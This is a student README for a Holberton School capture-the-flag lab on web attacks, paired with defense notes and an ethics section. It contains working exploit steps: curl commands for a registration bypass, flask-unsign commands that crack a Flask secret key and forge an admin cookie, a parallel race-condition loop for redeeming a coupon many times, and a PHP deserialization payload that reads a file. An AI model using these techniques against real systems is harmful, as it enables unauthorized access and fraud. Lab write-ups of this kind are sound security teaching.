# 0x0a - Advanced Web Attack Techniques

## 📋 Description

Cybersecurity project focused on **advanced web attack techniques** as part of the Holberton School Cyber Security program. This module explores complex vulnerabilities and sophisticated exploitation methods commonly encountered in modern web applications.

## 🎯 Learning Objectives

By the end of this project, you will be able to:

- Identify and exploit **deserialization** vulnerabilities in PHP applications
- Understand and conduct **Race Condition** attacks
- Bypass security restrictions on forms and endpoints
- Manipulate web sessions and perform **Session Tampering**
- Use professional pentesting tools (Burp Suite, Gobuster, flask-unsign)
- Analyze and understand source code to identify security flaws

## 🛠️ Technologies and Tools

### Pentesting Tools
- **Burp Suite** - HTTP request interception and manipulation
- **Gobuster** - Directory and file enumeration
- **flask-unsign** - Flask cookie manipulation
- **curl** - Command-line HTTP requests

### Target Environments
- PHP web applications
- Flask/Python applications
- Web servers with HTTP restrictions

### Wordlists
- `rockyou.txt` - Password and secret key bruteforce
- `dirb/common.txt` - File and directory enumeration

## 📂 Project Structure

```
0x0a_advanced_web_attack_techniques/
│
├── README.md                 # Project documentation
├── .gitignore               # Version control exclusions
│
├── 0-flag.txt               # Task 0 Flag
├── 1-flag.txt               # Task 1 Flag
├── 2-flag.txt               # Task 2 Flag
├── 3-flag.txt               # Task 3 Flag
├── 4-flag.txt               # Task 4 Flag
│
├── flag3.md                 # Task 3 Writeup (Race Condition)
└── flag4.md                 # Task 4 Writeup (PHP Deserialization)
```

## 🚀 Project Tasks

### Task 0 - Introduction to Advanced Attacks
**File:** `0-flag.txt`

Introduction to fundamental concepts of advanced web attacks and test environment setup.

---

### Task 1 - Reconnaissance and Enumeration
**File:** `1-flag.txt`

Using enumeration techniques to discover hidden endpoints and potential vulnerabilities.

**Skills:**
- Directory fuzzing
- HTTP response analysis
- Attack surface identification

---

### Task 2 - Session Tampering
**File:** `2-flag.txt`

Web session manipulation to escalate privileges or bypass access controls.

**Skills:**
- Cookie analysis
- Session token modification
- Authentication control bypass

---

### Task 3 - Race Condition & Registration Bypass
**Files:** `3-flag.txt`, `flag3.md`

Exploiting a race condition combined with registration restriction bypass to purchase a course without sufficient funds.

**Scenario:**
- Online course selling platform
- Registration disabled (frontend)
- User without purchase rights (`can_buy: false`)
- Single $50 discount coupon for a $100 course

**Exploited Vulnerabilities:**
1. **Registration Bypass** - The `/register` endpoint remains accessible despite the blocked interface
2. **Session Tampering** - Flask cookie signed with a weak key (`cookie1`)
3. **Race Condition** - Multiple coupon validation before deactivation

**Techniques:**
```bash
# 1. Registration bypass
curl -X POST -d "user=hacker&password=password123" http://web0x0a.task3.hbtn/register

# 2. Crack secret key
flask-unsign -u --cookie 'SESSION_COOKIE' --wordlist rockyou.txt --no-literal-eval

# 3. Forge admin cookie
flask-unsign --sign --cookie "{'user_id': 'hacker', 'can_buy': True}" --secret 'cookie1'

# 4. Race Condition - Multiple coupon validation
for i in {1..20}; do
    curl -X POST "http://web0x0a.task3.hbtn/redeem_coupon" \
         -b "session=FORGED_COOKIE" --silent &
done; wait

# 5. Final purchase
curl -X POST "http://web0x0a.task3.hbtn/buy" -b "session=FORGED_COOKIE"
```

**Lessons Learned:**
- Always validate server-side, never client-side only
- Implement locks/mutex for critical operations
- Use strong, random secret keys
- Rate limiting on endpoints

---

### Task 4 - PHP Deserialization & Upload Bypass
**Files:** `4-flag.txt`, `flag4.md`

Exploiting a PHP deserialization vulnerability via an upload form to read sensitive files.

**Scenario:**
- Hidden upload script (`/upload.php`)
- Automatic deserialization of uploaded objects
- Vulnerable `__wakeup()` magic method
- HTTP method restriction (POST blocked)

**Exploited Vulnerabilities:**
1. **PHP Object Injection** - Unsafe deserialization
2. **Arbitrary File Read** - File reading via `file_get_contents()`
3. **HTTP Method Bypass** - POST/PUT restriction bypass

**Vulnerable Code:**
```php
class Book {
    public function __wakeup() {
        // VULNERABILITY: No path validation
        $this->cover_image = file_get_contents($this->cover_path);
    }
}
```

**Exploit:**
```plaintext
# Malicious serialized payload (exploit.txt)
O:4:"Book":4:{
    s:5:"title";s:14:"Exploited Book";
    s:6:"author";s:8:"Attacker";
    s:10:"cover_path";s:22:"/var/www/html/flag.php";
    s:11:"cover_image";N;
}
```

**Exploitation Steps:**
1. **Reconnaissance** - Discover `/upload.php` with Gobuster
2. **Payload** - Create serialized `Book` object pointing to `/flag.php`
3. **HTTP Bypass** - Change `POST` → `PUT` in Burp Suite
4. **Exploitation** - Upload payload and retrieve flag content

**Lessons Learned:**
- Never deserialize untrusted data
- Validate and sanitize all file paths
- Don't rely solely on HTTP method restrictions
- Implement strict whitelist for uploads

---

## 🔒 Security Considerations

### Recommended Defenses

**Against Race Conditions:**
- Implement atomic transactions (ACID)
- Use locks (mutex, semaphores)
- Rate limiting on critical endpoints
- Anti-CSRF tokens with single use

**Against Deserialization:**
- Avoid deserializing user data
- Use JSON instead of serialize/unserialize
- Strict whitelist of allowed classes
- Integrity validation (HMAC)

**Against Session Tampering:**
- Cryptographically strong secret keys (32+ random bytes)
- Regular key rotation
- HMAC signature on cookies
- HTTPOnly and Secure flags on cookies

**Against Upload Bypasses:**
- Server-side validation of real MIME type
- Storage outside webroot
- Restrictive permissions on uploads
- Antivirus scanning of uploaded files

---

## 📚 Resources and References

### Official Documentation
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)

### Tools
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [Gobuster GitHub](https://github.com/OJ/gobuster)
- [flask-unsign](https://pypi.org/project/flask-unsign/)

### CTF and Practice
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

## ⚖️ Legal and Ethical Framework

> **IMPORTANT WARNING**

This project is conducted within a **controlled educational framework** with authorized test environments (Holberton School infrastructure).

### Authorized Use
✅ Dedicated test environments (*.hbtn, labs, CTF)
✅ Applications with written permission from owner
✅ Bug bounty programs with clear rules of engagement
✅ Contractual pentests with defined scope

### PROHIBITED Use
❌ Attacks on systems without explicit authorization
❌ Unauthorized access to sensitive data
❌ Denial of service (DoS/DDoS)
❌ Using learned techniques for malicious purposes

**The techniques presented are professional offensive security tools. Their illegal use is a crime punishable by law.**

---

## 👤 Author

**Patri** - Cybersecurity Student @ Holberton School

---

## 📝 License

This project is conducted as part of the Holberton School Cyber Security program.
Educational use only.

---

## 🏆 Progress

- [x] Task 0 - Introduction
- [x] Task 1 - Reconnaissance
- [x] Task 2 - Session Tampering
- [x] Task 3 - Race Condition
- [x] Task 4 - PHP Deserialization

**Project completed successfully** ✨
